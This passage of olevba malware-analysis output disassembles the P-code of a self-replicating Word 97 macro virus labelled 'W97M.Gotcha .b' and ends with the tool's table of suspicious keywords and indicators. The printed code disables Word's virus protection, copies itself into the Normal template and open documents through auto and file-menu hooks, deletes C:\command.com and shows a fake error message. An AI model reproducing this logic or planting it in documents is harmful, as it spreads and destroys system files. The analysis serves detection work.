' Line #663:
' 	EndIfBlock 
' Line #664:
' 	Ld girl 
' 	LitDI2 0x0045 
' 	Eq 
' 	IfBlock 
' Line #665:
' 	LitStr 0x000F "C:\autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #666:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "Echo GOTCHA!"
' 	PrintItemNL 
' Line #667:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #668:
' 	EndIfBlock 
' Line #669:
' 	Ld girl 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #670:
' 	LitStr 0x0015 "C:\windows\gotcha.dll"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #671:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "W97M.Gotcha .b Variant for Word 97"
' 	PrintItemNL 
' Line #672:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ".b strain created by Trix"
' 	PrintItemNL 
' Line #673:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "for your personal enjoyment"
' 	PrintItemNL 
' Line #674:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0028 "Have a Nice Day....I know I'm having fun"
' 	PrintItemNL 
' Line #675:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "             GOTCHA               "
' 	PrintItemNL 
' Line #676:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #677:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #678:
' 	EndIfBlock 
' Line #679:
' 	Ld girl 
' 	LitDI2 0x007A 
' 	Eq 
' 	IfBlock 
' Line #680:
' 	LitStr 0x0012 "C:\windows\err.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #681:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002C "based off of groovie.a with a twist of Trix®"
' 	PrintItemNL 
' Line #682:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #683:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #684:
' 	EndIfBlock 
' Line #685:
' 	Ld girl 
' 	LitDI2 0x00C8 
' 	Eq 
' 	IfBlock 
' Line #686:
' 	LitStr 0x000B "..........."
' 	LitDI2 0x0006 
' 	LitStr 0x0014 "*nŽšíjşÄtŻ&�9 ÉqeiÔ™"
' 	ArgsCall MsgBox 0x0003 
' Line #687:
' 	EndIfBlock 
' Line #688:
' 	Ld girl 
' 	LitDI2 0x00DC 
' 	Eq 
' 	IfBlock 
' Line #689:
' 	LitStr 0x000E "C:\command.com"
' 	ArgsCall Kill 0x0001 
' Line #690:
' 	LitStr 0x0054 "A fatal error has occured at FFEE:FFFF.  Save all documents and close Microsoft Word"
' 	LitDI2 0x0010 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #691:
' 	EndIfBlock 
' Line #692:
' 	Ld girl 
' 	LitDI2 0x012C 
' 	Eq 
' 	IfBlock 
' Line #693:
' 	LitStr 0x0006 "Gotcha"
' 	ArgsCall SendKeys 0x0001 
' Line #694:
' 	EndIfBlock 
' Line #695:
' 	EndFunc 
' Line #696:
' 	FuncDefn (Sub AutoExec())
' Line #697:
' 	OnError (Resume Next) 
' Line #698:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #699:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #700:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #701:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #702:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #703:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #704:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #705:
' Line #706:
' 	EndSub 
' Line #707:
' Line #708:
' 	FuncDefn (Sub AutoClose())
' Line #709:
' 	OnError (Resume Next) 
' Line #710:
' 	LitVarSpecial (True)
' 	St Exitt_Word 
' Line #711:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #712:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #713:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #714:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #715:
' 	ArgsCall (Call) Gotcha_Payload 0x0000 
' Line #716:
' 	EndSub 
' Line #717:
' 	FuncDefn (Sub AutoExit())
' Line #718:
' 	OnError (Resume Next) 
' Line #719:
' 	LitVarSpecial (True)
' 	St Exitt_Word 
' Line #720:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #721:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #722:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #723:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #724:
' 	ArgsCall (Call) Gotcha_Payload 0x0000 
' Line #725:
' 	EndSub 
' Line #726:
' 	FuncDefn (Sub FileSaveAs())
' Line #727:
' 	OnError (Resume Next) 
' Line #728:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #729:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #730:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #731:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #732:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #733:
' 	ArgsCall (Call) Gotcha_Payload 0x0000 
' Line #734:
' 	Ld WordBasic 
' 	ArgsMemCall filesave 0x0000 
' Line #735:
' 	EndSub 
' Line #736:
' 	FuncDefn (Sub filesave())
' Line #737:
' 	OnError (Resume Next) 
' Line #738:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #739:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #740:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #741:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #742:
' 	Ld WordBasic 
' 	ArgsMemCall filesave 0x0000 
' Line #743:
' 	ArgsCall (Call) Gotcha_Payload 0x0000 
' Line #744:
' 	Ld WordBasic 
' 	ArgsMemCall filesave 0x0000 
' Line #745:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #746:
' 	EndSub 
' Line #747:
' 	FuncDefn (Sub fileclose())
' Line #748:
' 	OnError (Resume Next) 
' Line #749:
' 	LitVarSpecial (True)
' 	St Exitt_Word 
' Line #750:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #751:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #752:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #753:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #754:
' 	ArgsCall (Call) Gotcha_Payload 0x0000 
' Line #755:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #756:
' 	Ld WordBasic 
' 	ArgsMemCall filesave 0x0000 
' Line #757:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #758:
' 	EndSub 
' Line #759:
' 	FuncDefn (Sub fileprint())
' Line #760:
' 	OnError (Resume Next) 
' Line #761:
' 	ArgsCall (Call) Gotcha_Payload 0x0000 
' Line #762:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #763:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #764:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #765:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #766:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #767:
' 	EndSub 
' Line #768:
' 	FuncDefn (Sub ViewVBCode())
' Line #769:
' 	EndSub 
' Line #770:
' 	FuncDefn (Sub ToolsMacro())
' Line #771:
' 	EndSub 
' Line #772:
' 	FuncDefn (Sub FileTemplates())
' Line #773:
' 	EndSub 
' Line #774:
' 	FuncDefn (Sub ToolsCustomize())
' Line #775:
' 	EndSub 
' Line #776:
' 	FuncDefn (Function Check_For_Doc())
' Line #777:
' 	OnError docek 
' Line #778:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #779:
' 	LitVarSpecial (True)
' 	St Scan_For_Doc 
' Line #780:
' 	EndIfBlock 
' Line #781:
' 	GoTo over 
' Line #782:
' 	Label docek 
' Line #783:
' 	LitVarSpecial (False)
' 	St Scan_For_Doc 
' Line #784:
' 	Label over 
' Line #785:
' 	EndFunc 
' Line #786:
' Line #787:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |VBProject.VBE       |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |gotcha.dll          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

